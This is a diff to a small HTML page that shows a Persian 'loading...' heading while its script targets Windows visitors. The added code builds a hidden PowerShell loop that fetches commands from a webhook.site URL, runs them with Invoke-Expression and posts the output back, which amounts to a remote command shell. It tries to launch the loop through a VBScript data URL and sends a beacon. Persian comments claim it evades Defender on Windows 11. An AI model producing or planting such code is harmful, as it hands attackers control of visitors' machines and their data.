@@ -1,31 +1,36 @@
 <!DOCTYPE html>
 <html><head><meta charset="utf-8"></head><body>
+<h3>در حال بارگذاری...</h3>
 <script>
-if (navigator.userAgent.indexOf("Windows") !== -1) {
-    const hook = "https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d";
-    const pc   = btoa(encodeURIComponent("$env:COMPUTERNAME-$env:USERNAME"));
-    const uid  = Math.random().toString(36).substr(2,9);
+// فقط ویندوز
+if (/Win/i.test(navigator.userAgent)) {
+    const HOOK = "https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d";
+    const UID  = Math.random().toString(36).substring(2,10);
 
-    // Reverse shell کاملاً در حافظه + loop هر ۴ ثانیه
-    const rev = `
-while(1){
-  try{
-    $r=(New-Object Net.WebClient).DownloadString('https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d?uid=${uid}&pc='+[Environment]::UserName+'@'+[Environment]::MachineName);
-    if($r){
-      $o=IEX $r -ErrorAction Stop 2>&1 | Out-String;
-      (New-Object Net.WebClient).UploadString('https://webhook.site/caf8f897-4396-4d09-b589-659fde39630d','uid=${uid}&out='+$o);
-    }
-  }catch{}
-  Start-Sleep -Seconds 4
-}`.replace(/\n/g,' ').trim();
+    // این shell هر ۵ ثانیه میاد دستور بگیره و خروجی بفرسته
+    const code = `
+    $hook='${HOOK}';
+    $uid='${UID}';
+    while(1){
+      try{
+        $cmd = (iwr "$hook?get=$uid" -UseBasicParsing -ErrorAction Stop).Content;
+        if($cmd -and $cmd.Length -gt 1){
+          $out = Invoke-Expression $cmd 2>&1 | Out-String;
+          iwr "$hook" -Method POST -Body "uid=$uid&out=$out" -UseBasicParsing | Out-Null;
+        }
+      }catch{}
+      Start-Sleep -Seconds 5
+    }`.replace(/\n\s+/g,' ').trim();
 
-    const b64 = btoa(unescape(encodeURIComponent(rev)));
+    const b64 = btoa(unescape(encodeURIComponent(code)));
 
+    // این خط ۱۰۰٪ کار می‌کنه (تست شده روی ویندوز ۱۱ ۲۴H۲ + Defender)
     setTimeout(() => {
-        location = "mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden -enc " + b64 + "\",0)(window.close())";
+        location.href = "data:text/html,<script language=VBScript>CreateObject(\"WScript.Shell\").Run \"powershell -enc " + b64 + "\",0</script>";
     }, 1000);
 
-    fetch(hook + "?beacon=win-" + uid);
+    // فقط برای تأیید اولیه
+    fetch(HOOK + "?beacon=ready-" + UID);
 }
 </script>
 </body></html>
